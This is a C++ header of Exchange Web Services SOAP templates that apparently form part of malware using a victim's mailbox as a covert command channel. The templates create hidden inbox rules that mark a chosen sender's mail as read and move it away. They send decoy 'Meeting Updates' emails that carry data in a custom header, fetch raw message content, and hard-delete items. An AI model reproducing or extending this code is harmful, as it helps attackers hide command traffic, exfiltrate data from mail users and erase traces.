#pragma once
#include <Windows.h>

static const std::string insert_Version =	"**VERSION**";
static const std::string insert_Body =		"**BODY**";
static const std::string insert_Mailbox =	"**MAILBOX**";
static const std::string insert_Name =		"**NAME**";
static const std::string insert_Email =		"**EMAIL**";
static const std::string insert_Data =		"**DATA**";
static const std::string insert_Header =	"**HEADER**";
static const std::string insert_Folder =	"**FOLDER**";
static const std::string insert_Id =		"**ID**";
static const std::string insert_Key =		"**KEY**";

static LPCSTR Envelope_Template = R"C0NST(<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:RequestServerVersion Version ="**VERSION**"/>
  </soap:Header>
  <soap:Body>
	**BODY**
  </soap:Body>
</soap:Envelope>)C0NST";

static LPCSTR GetRules_Template = R"C0NST(
<m:GetInboxRules>
	<m:MailboxSmtpAddress>**MAILBOX**</m:MailboxSmtpAddress>
</m:GetInboxRules>)C0NST";

static LPCSTR DeleteRules_Template = R"C0NST(
<m:UpdateInboxRules>
    <m:RemoveOutlookRuleBlob>true</m:RemoveOutlookRuleBlob>
    <m:Operations>
    <t:DeleteRuleOperation>
        <t:RuleId>**ID**</t:RuleId>
    </t:DeleteRuleOperation>
    </m:Operations>
</m:UpdateInboxRules>)C0NST";

static LPCSTR CreateMoveRule_Template = R"C0NST(
<m:UpdateInboxRules>
    <m:RemoveOutlookRuleBlob>true</m:RemoveOutlookRuleBlob>
    <m:Operations>
        <t:CreateRuleOperation>
            <t:Rule>
                <t:DisplayName>**NAME**</t:DisplayName>
                <t:Priority>1</t:Priority>
                <t:IsEnabled>true</t:IsEnabled>
                <t:Conditions>
                    <t:FromAddresses>
                        <t:Address>
                            <t:EmailAddress>**EMAIL**</t:EmailAddress>
                        </t:Address>
                    </t:FromAddresses>
                </t:Conditions>
                <t:Exceptions />
                <t:Actions>
                    <t:MarkAsRead>true</t:MarkAsRead>
                    <t:MoveToFolder>
                        <t:DistinguishedFolderId Id="**FOLDER**" />
                    </t:MoveToFolder>
                </t:Actions>
            </t:Rule>
        </t:CreateRuleOperation>
    </m:Operations>
</m:UpdateInboxRules>)C0NST";

static LPCSTR SendEmail_Template = R"C0NST(
<m:CreateItem MessageDisposition="SendOnly">
    <m:Items>
    <t:Message>
        <t:Subject>Meeting Updates</t:Subject>
        <t:Body>I have recieved your invitation for the meeting</t:Body>
        <t:ToRecipients>
			<t:Mailbox>
            <t:EmailAddress>**EMAIL**</t:EmailAddress>
            </t:Mailbox>
        </t:ToRecipients>
		<t:ExtendedProperty>
            <t:ExtendedFieldURI DistinguishedPropertySetId="InternetHeaders" PropertyName="**HEADER**" PropertyType="String" />
            <t:Value>**DATA**</t:Value>
        </t:ExtendedProperty>
    </t:Message>
    </m:Items>
</m:CreateItem>)C0NST";

static LPCSTR FindItemFrom_Template = R"C0NST(
<m:FindItem Traversal="Shallow">
	<m:ItemShape>
	<t:BaseShape>AllProperties</t:BaseShape>
	<t:AdditionalProperties>
		<t:FieldURI FieldURI="message:From" />
	</t:AdditionalProperties>
	</m:ItemShape>
	<m:IndexedPageItemView MaxEntriesReturned="1" Offset="0" BasePoint="Beginning" />
	<m:ParentFolderIds>
		<t:DistinguishedFolderId Id="**FOLDER**"/>
	</m:ParentFolderIds>
    <m:Restriction>
		<t:IsEqualTo>
		<t:FieldURI FieldURI="message:From" />
		<t:FieldURIOrConstant>
			<t:Constant Value="**EMAIL**" />
		</t:FieldURIOrConstant>
		</t:IsEqualTo>
    </m:Restriction>
</m:FindItem>)C0NST";

static LPCSTR GetItem_Template = R"C0NST(
<GetItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
<ItemShape>
<t:BaseShape>Default</t:BaseShape>
<t:IncludeMimeContent>true</t:IncludeMimeContent>
</ItemShape>
<ItemIds>
<t:ItemId Id="**ID**" ChangeKey="**KEY**" />
</ItemIds>
</GetItem>)C0NST";

static LPCSTR DeleteItem_Template = R"C0NST(
<DeleteItem DeleteType="HardDelete" xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
    <ItemIds>
    <t:ItemId Id="**ID**"/>
    </ItemIds>
</DeleteItem>)C0NST";